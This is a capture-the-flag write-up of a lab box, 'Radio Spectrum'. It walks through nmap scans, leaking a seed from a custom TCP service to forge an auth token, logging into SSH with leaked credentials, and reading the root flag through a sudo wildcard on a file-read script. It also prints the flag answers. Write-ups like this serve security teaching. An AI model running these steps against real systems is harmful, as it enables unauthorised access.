<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Radio+Spectrum" alt="Typing SVG" /></a>

</div>

# Radio Spectrum — PWN · JID-Pwn301 · Level 5 · 🔴 HARD

- **Status:** ✅ SOLVED (4/4) — seed-leak token forgery → SSH → sudo file-read, full chain.
- **Points:** 2400 / 2400
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (flags 1–2 plaintext, 3–4 `CTF{...}`)
- **Target:** `10.10.10.31` (lab, over VPN)
- **Prompt:** *boot2root — SSH + a custom TCP "spectrum desk" text service*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2022,8800` | ✅ |
| 2 | Low privilege user | `operator` | ✅ |
| 3 | User flag | `CTF{d5a1b86b1e6d62f98e2503ce2cfcaed0}` | ✅ |
| 4 | Root flag | `CTF{dc88e0589fdd01addf84d560c91a2ca4}` | ✅ |

---

## TL;DR

1. `:8800` is not HTTP but a custom TCP "spectrum desk" that leaks the two halves of a fixed 64-bit seed via its `AUTH` length/`?` branches → `seed = 4f91c0aa91bb07e2`.
2. `token = sha256(seedhex + "ops")[:16]` = `75b48aff02386e01`; `GETLOG ops <token>` dumps SSH creds `operator / band-4f` → user flag.
3. Root is a `sudo NOPASSWD python3 readlog.py *` that `open()`s any path with no allowlist → read `/root/root.txt` directly.

9th sibling of the JID boot2root series (cf. `HarborWatch`, `NightWatchRoster`, `EscortConvoy`, `VisitorBadges`, `RadioShack`, `CoastalRadar`, `EmbassyGate`, `AidShipments`). Same 4-flag skeleton, but reported **Hard**: the foothold here is a hand-rolled TCP text protocol, not the usual `BaseHTTPServer` app.

> Flag format: `CTF{...}`. Every command was executed manually by the user against the box.

---

## 0. Connect to the lab

```bash
cd /home/felipebc2/repo/CTF/CentinelI          # team-71-player-a.conf lives here (never read/commit it)
sudo wg-quick up ./team-71-player-a.conf
ping -c1 10.10.10.31
```

## Recon — Flag 1: Open TCP ports

```bash
sudo nmap -sS -p- -T4 --max-retries 6 -Pn -n 10.10.10.31 -oN nmap-31-full.txt
sudo nmap -sC -sV -p <PORTS> -Pn -n 10.10.10.31 -oN nmap-31-svc.txt
```

**Flag 1** = `2022,8800` ✅ (+225)

## Foothold — Flag 2: Low privilege user

**The twist (Hard):** port 8800 is **not** HTTP — it's a custom TCP text service ("spectrum desk") with a seed-leak + token scheme. HELP:

```
AUTH <name>   (>12 chars)   -> prints LEFT 8 hex of the seed  ("overflow left=...")
AUTH <name>?  (<=12, ends ?) -> prints RIGHT 8 hex of the seed ("diag right=...")
token = sha256(seed + channel) hex, first 16 digits
GETLOG <channel> <token>    -> dumps the channel log   (live channel: ops)
```

Key quirks found by probing (`probe.py`):
- **Length check wins:** a name >12 chars always gives `overflow left` and ignores a trailing `?`. The RIGHT half needs a **short** name ending in `?`.
- **One AUTH per connection**, and the **seed is fixed** (not per-connection) → leak each half on its own fresh connection.

Leak → `seed = 4f91c0aa91bb07e2`. Token for channel `ops` = `sha256("4f91c0aa91bb07e2" + "ops")[:16]` = `75b48aff02386e01` (seed as its **hex string**, not raw bytes). Then:

```
GETLOG ops 75b48aff02386e01  ->  ssh operator / band-4f
```

Full chain automated in `solve.py`. Confirmed:

```bash
sshpass -p 'band-4f' ssh -p 2022 -o StrictHostKeyChecking=no operator@10.10.10.31 id
# uid=1000(operator) gid=37(operator) groups=37(operator)
```

**Flag 2** = `operator` ✅ (+425)

## User flag — Flag 3

```bash
sshpass -p 'band-4f' ssh -p 2022 operator@10.10.10.31 'cat /home/user.txt'
```

**Flag 3** = `CTF{d5a1b86b1e6d62f98e2503ce2cfcaed0}` ✅

## Privesc — Flag 4: Root flag

```
sudo -n -l
# (root) NOPASSWD: /usr/bin/python3 /opt/spectrum/readlog.py *
```

`/opt/spectrum/readlog.py` (root-owned, world-readable):

```python
import sys
path, quota = sys.argv[1], int(sys.argv[2])
if quota > 100:
    sys.exit('quota exceeded')
print(open(path).read(), end='')
```

Plain **arbitrary file read as root**: it `open()`s `argv[1]` with no path restriction, gated only by `argv[2] <= 100`. The sudo rule's `*` lets operator supply both args, so point it at the root flag:

```bash
sudo -n /usr/bin/python3 /opt/spectrum/readlog.py /root/root.txt 1
```

**Flag 4** = `CTF{dc88e0589fdd01addf84d560c91a2ca4}` ✅ (+1100)

---

## Takeaways
- **Series broke the HTTP pattern (Hard).** Every prior sibling served a Python `BaseHTTPServer` app; here :8800 is a hand-rolled TCP text protocol. Fingerprint the service, read its HELP, don't assume HTTP.
- **Info leak by length/format branch.** The `>12 chars` vs `ends in ?` branches leak the two halves of a fixed 64-bit seed. A secret you can reconstruct from two "diagnostic" responses is a secret you've published. Never expose seed material in debug output.
- **`sha256(seed+channel)` with a leakable seed = forgeable token.** The auth token is pure function of a value the client can recover → trivially forged. Authenticators must depend on a secret the client can't extract.
- **sudo + wildcard + file read = root read.** `NOPASSWD python3 readlog.py *` hands root's `open()` to a low user with no path allowlist. Classic series ending (arbitrary read instead of the usual `source`/writable-script), same lesson: never give a privileged wrapper an unconstrained argument.
